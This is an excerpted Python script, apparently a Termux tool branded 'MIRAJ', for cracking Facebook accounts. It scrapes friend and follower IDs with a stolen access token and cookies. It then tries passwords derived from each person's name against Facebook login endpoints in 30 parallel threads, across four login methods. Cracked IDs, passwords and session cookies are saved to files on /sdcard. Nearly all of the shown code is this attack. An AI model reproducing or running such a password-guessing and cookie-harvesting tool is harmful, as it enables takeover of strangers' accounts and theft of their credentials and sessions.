...
from concurrent.futures import ThreadPoolExecutor as MIRAJMIRAJ
from string import * 
...
sys.stdout.write('\x1b]2; MIRAJ\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
logo =                                          """            
\033[1;37m_      _  ____  ____     _ 
\033[1;37m/ \__/|/ \/  __\/  _ \   / |
\033[1;37m| |\/||| ||  \/|| / \|   | |
\033[1;37m| |  ||| ||    /| |-||/\_| |
\033[1;37m\_/  \|\_/\_/\_\\_/ \|\____/
\033[1;37m
\033[1;37m
\033[1;37m------------------------------------------------
\033[1;37m Owner   :            Muhammad MIRAJ
\033[1;37m Facebook:            Muhammad MIRAJ
\033[1;37m Github  :            MIRAJ-MIRAJ
\033[1;37m Version :            20.0
\033[1;37m------------------------------------------------ """
def clear():
    os.system("clear")
    print(logo)    
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back MIRAJ Menu ")
        exit()
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[MIRAJ] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
"api_key": "882a8490361da98702bf97a021ddc14d"}
    ...
    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);MIRAJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={MIRAJb};{ckkk}"
                    print(f"\r{R} [MIRAJ-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/MIRAJ_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/MIRAJ_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [MIRAJ-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/MIRAJ_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[MIRAJ] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
"api_key": "882a8490361da98702bf97a021ddc14d"}
    ...
    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [MIRAJ-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/MIRAJ_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/MIRAJ_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [MIRAJ-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[MIRAJ] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
"api_key": "882a8490361da98702bf97a021ddc14d"}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[MIRAJ] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [MIRAJ-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/MIRAJ_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            os.system("clear")
            print(logo)
            print(f'{S} [Example: first123,first@123,last1122,first last,last,57273200]')
            print('')
            if sl =='':
            ...
            print(47*"-")
            with MIRAJMIRAJ(max_workers=30) as MIRAJworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                MIRAJworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                MIRAJworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                MIRAJworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                MIRAJworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
...
def login():
    ...
    try:
        ...
        info = requests.get('https://mbasic.facebook.com/me/?access_token='+token,cookies = {"cookie":fbcokis}).json()
    ...
    try:
        ...
        for rept in range(srange):
            ...
            if  fbuid=='stop':
                ...
                ys.close()
            try:
                dmp = requests.get('https://mbasic.facebook.com/',+fbuid+"/friends?limit=5000&access_token="+token,cookies = {"cookie":fbcokis}).json()
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/MIRAJ.txt') 
        print(47*"-")
...
def follower():
    ...
    try:
        ...
        try:
            ...
            clear()
            dmp = requests.get('https://mbasic.facebook.com/',+fbbuid+"/friends?limit=5000&access_token="+token,cookies = {"cookie":fbcokis}).json()
            for idnm in dmp['friends']['data']:
                totaldmp+=1
                fbidz.append(idnm['id'])
        except KeyError:
        ...
        for fbuid in fbidz:
            count += 1
            try:
                dmp = requests.get('https://mbasic.facebook.com/',+fbuid+"?fields=subscribers.limit(5000)&access_token="+token,cookies = {"cookie":fbcokis}).json()
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/MIRAJ.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    MIRAJ = input('Put File Name :')
    print(" ")
    MIRAJ = input('Saving Put File Name :')
    os.system('touch ' +MIRAJ)
    os.system('sort -r '+MIRAJ+' | uniq > '+MIRAJ)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + MIRAJ )
    print(47*'-')
    print("File Saved To :" + MIRAJ )
    print(47*'-')
    input(f"{S} Press Enter To Back MIRAJ Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/MIRAJ.txt\n') 
        filepath = input("Put File Name: ")
        ...
        for rept in range(srange):
            ...
            if  sid=='stop':
                ...
                ys.close()
            try:
                dmp = requests.get('https://mbasic.facebook.com/',+sid+"/friends?limit=5000&access_token="+token,cookies = {"cookie":fbcokis}).json()
                for idnm in dmp['friends']['data']:
                    totaldmp+=1
                    apnd.write(idnm['id']+"|"+idnm['name']+'\n')                      
            except KeyError:
